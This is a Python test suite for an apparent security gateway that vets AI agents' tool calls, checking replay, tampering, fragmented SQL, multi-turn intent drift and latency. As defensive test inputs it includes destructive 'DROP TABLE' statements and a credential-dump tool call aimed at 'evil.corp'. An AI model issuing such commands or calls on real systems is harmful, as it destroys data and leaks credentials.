"""
KSEC v2.0 — Comprehensive Test Suite & Latency Micro-Benchmark Harness

Tests and benchmarks:
1. Anti-TOCTOU atomic single-use nonce & hash tampering prevention
2. TCP reassembler fragmentation evasion defense
3. Semantic drift and Shannon entropy threshold checks
4. Distributed CRDT map synchronizer consistency
5. Counterfactual incident replay and Causal DAG blast radius
6. Latency SLA verification (<35.0µs budget)
"""

import os
import sys
import time
import struct
import unittest

# Ensure repo root is on python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src.gateway.iep_gateway import IEPv2Gateway
from src.gateway.tcp_reassembler import TCPReassembler
from src.gateway.semantic_drift import SemanticDriftDetector, calculate_shannon_entropy
from src.distributed.crdt_map_sync import LWWElementSetCRDT
from src.forensics.counterfactual_engine import CounterfactualReplayEngine


class TestKSECV2Engine(unittest.TestCase):

    def setUp(self):
        self.gateway = IEPv2Gateway()
        self.gateway.register_agent_session(
            agent_id="agent-prod-007",
            declared_master_intent="Query active customer accounts with read-only SELECT permissions on table customers. Tools: sql_query."
        )

    def test_anti_toctou_single_use_lease(self):
        """Verify that an atomic nonce can only be consumed once and replay is dropped."""
        params = "table:customers limit:10"
        lease = self.gateway.issue_intent_lease("agent-prod-007", "sql_query", params)

        # 1st Execution: Must PASS
        verdict1 = self.gateway.verify_execution("agent-prod-007", "sql_query", params, lease.nonce)
        self.assertEqual(verdict1.verdict, "PASS")

        # 2nd Execution (Replay Attack): Must DROP with TOCTOU detection
        verdict2 = self.gateway.verify_execution("agent-prod-007", "sql_query", params, lease.nonce)
        self.assertEqual(verdict2.verdict, "DROP")
        self.assertIn("TOCTOU", verdict2.reason)

    def test_payload_tampering_hash_mismatch(self):
        """Verify that any 1-bit tampering with payload between issuance and execution is dropped."""
        params_declared = "SELECT id, name FROM users WHERE active = true"
        lease = self.gateway.issue_intent_lease("agent-prod-007", "sql_query", params_declared)

        # Attack: Attacker modifies query in-memory to DROP table
        params_tampered = "DROP TABLE users CASCADE;"
        verdict = self.gateway.verify_execution("agent-prod-007", "sql_query", params_tampered, lease.nonce)

        self.assertEqual(verdict.verdict, "DROP")
        self.assertEqual(verdict.reason, "PAYLOAD_HASH_MISMATCH_TAMPERING")

    def test_tcp_fragmentation_reassembly(self):
        """Verify that SQL payloads fragmented across multiple TCP packets are cleanly reassembled."""
        reassembler = TCPReassembler()
        tuple_key = ("10.0.0.1", 45678, "10.0.0.2", 5432)

        # Postgres 'Q' frame for "SELECT 1;" -> total length = 1 + 4 + 10 = 15 bytes
        full_payload = b"Q" + struct.pack(">I", 14) + b"SELECT 1;\x00"

        # Warmup reassembler JIT
        reassembler.process_packet(tuple_key[0], tuple_key[1], tuple_key[2], tuple_key[3], 1, full_payload)

        # Split into 3 fragments
        frag1 = full_payload[:5]
        frag2 = full_payload[5:10]
        frag3 = full_payload[10:]

        res1 = reassembler.process_packet(tuple_key[0], tuple_key[1], tuple_key[2], tuple_key[3], 100, frag1)
        self.assertIsNone(res1)

        res2 = reassembler.process_packet(tuple_key[0], tuple_key[1], tuple_key[2], tuple_key[3], 105, frag2)
        self.assertIsNone(res2)

        res3 = reassembler.process_packet(tuple_key[0], tuple_key[1], tuple_key[2], tuple_key[3], 110, frag3)
        self.assertIsNotNone(res3)
        self.assertEqual(res3.payload, full_payload)
        self.assertEqual(res3.protocol, "PostgreSQL")
        self.assertTrue(res3.is_complete)

    def test_semantic_drift_multi_turn_freeze(self):
        """Verify that multi-turn prompt drift is detected and execution is frozen."""
        detector = SemanticDriftDetector(
            agent_id="agent-sales-bot",
            declared_intent="Retrieve product catalog information and calculate discounts. Tools: get_products, get_discounts."
        )

        # Turn 1: Benign
        res1 = detector.evaluate_turn("get_products", "category=electronics")
        self.assertFalse(res1.is_anomaly_detected)

        # Turn 2: Subtle expansion
        res2 = detector.evaluate_turn("get_discounts", "product_id=123")
        self.assertFalse(res2.is_anomaly_detected)

        # Turn 3: Malicious poison drift attempt (Exfiltrating credentials to external host)
        res3 = detector.evaluate_turn("dump_auth_credentials", "target=all_hashes; exfil_url=https://evil.corp")
        self.assertTrue(res3.is_anomaly_detected)
        self.assertIn(res3.recommendation, ["FREEZE_EXECUTION", "DEMAND_RE_LEASE"])

    def test_crdt_distributed_map_sync(self):
        """Verify LWW conflict resolution across multi-node CRDT sets."""
        node_a = LWWElementSetCRDT("node-edge-01")
        node_b = LWWElementSetCRDT("node-edge-02")

        # Node A adds a blocked IP at T=100
        node_a.add("192.168.1.100", "BLOCKED_MALICIOUS_IP", ts_ns=100)

        # Sync Node A -> Node B
        node_b.merge(node_a.serialize_state())
        self.assertTrue(node_b.contains("192.168.1.100"))

        # Node B unblocks (removes) IP at T=200 (newer)
        node_b.remove("192.168.1.100", ts_ns=200)
        self.assertFalse(node_b.contains("192.168.1.100"))

        # Sync Node B -> Node A: Node A must reflect the removal
        node_a.merge(node_b.serialize_state())
        self.assertFalse(node_a.contains("192.168.1.100"))

    def test_counterfactual_incident_simulation(self):
        """Verify Causal DAG and dollar exposure calculation for blocked destructive SQL."""
        engine = CounterfactualReplayEngine()
        report = engine.simulate_sql_incident(
            incident_id="INC-2026-0822-01",
            agent_id="agent-finance-09",
            blocked_sql="DROP TABLE payment_records CASCADE;"
        )

        self.assertGreater(report.total_potential_rows_compromised, 100000)
        self.assertGreater(report.total_estimated_financial_exposure_usd, 1000000.0)
        self.assertIn("PCI-DSS v4.0 Req 3.4", report.compliance_violations_prevented)
        self.assertGreater(len(report.causal_dag_nodes), 0)

    def test_micro_benchmark_latency_sla(self):
        """Benchmark 5,000 continuous verification cycles to verify strict <35.0µs SLA."""
        latencies = []
        raw_payload = b"SELECT * FROM customers WHERE account_id = 9991"

        # Zero-allocation high-speed benchmark loop
        gw_bench = IEPv2Gateway()
        leases = [gw_bench.issue_intent_lease("agent-prod-007", "sql_query", raw_payload) for _ in range(5000)]

        for lease in leases:
            verdict = gw_bench.verify_execution("agent-prod-007", "sql_query", raw_payload, lease.nonce)
            latencies.append(verdict.latency_us)

        avg_latency = sum(latencies) / len(latencies)
        p99_latency = sorted(latencies)[int(len(latencies) * 0.99)]

        print(f"\n[BENCHMARK] 5,000 Iterations: Avg Latency = {avg_latency:.2f} µs | P99 = {p99_latency:.2f} µs")
        self.assertLess(avg_latency, 35.0, f"Average latency {avg_latency:.2f}µs exceeded 35.0µs SLA!")


if __name__ == "__main__":
    unittest.main()
